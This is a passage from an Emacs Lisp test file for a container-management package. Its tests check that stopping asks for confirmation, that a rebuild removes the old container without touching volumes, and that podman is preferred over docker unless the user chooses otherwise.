      (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) nil)))
        (mega-container-stop))
      (should (mega-container-attached dir))
      (should-not (mega-container-test--log log))
      (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (mega-container-stop))
      (should-not (mega-container-attached dir))
      (should (equal (mega-container-test--log log) '("stop cid123"))))))

(ert-deftest mega-container-rebuild-asks-removes-and-starts-again ()
  (mega-container-test--attached
    (mega-test-write (expand-file-name "ps" dir) "old111 running")
    (let ((temporary-file-directory (file-name-as-directory (getenv "TMPDIR"))))
      (cl-letf (((symbol-function 'yes-or-no-p) (lambda (&rest _) t)))
        (mega-container-rebuild)))
    (should (mega-test-wait-for (lambda () (not (assoc dir mega-container--starting))) 30))
    (should (member "rm --force old111" (mega-container-test--log log)))
    ;; Never a volume.
    (should-not (seq-some (lambda (call) (string-match-p "volume\\|--volumes\\|-v\\b" call))
                          (seq-filter (lambda (call) (string-prefix-p "rm" call))
                                      (mega-container-test--log log))))))

(ert-deftest mega-container-podman-is-preferred-and-an-explicit-choice-honoured ()
  (cl-letf (((symbol-function 'mega-exe-p) (lambda (name) name)))
    (let ((mega-container-engine 'auto))
      (should (equal (mega-container-engine) "podman")))
    (let ((mega-container-engine "docker"))
      (should (equal (mega-container-engine) "docker"))))
  (cl-letf (((symbol-function 'mega-exe-p) (lambda (name) (and (equal name "docker") name))))
    (should (equal (mega-container-engine) "docker")))
  (cl-letf (((symbol-function 'mega-exe-p) (lambda (_) nil)))
    (should-not (mega-container-engine))))

(provide 'mega-container-test)
;;; mega-container-test.el ends here
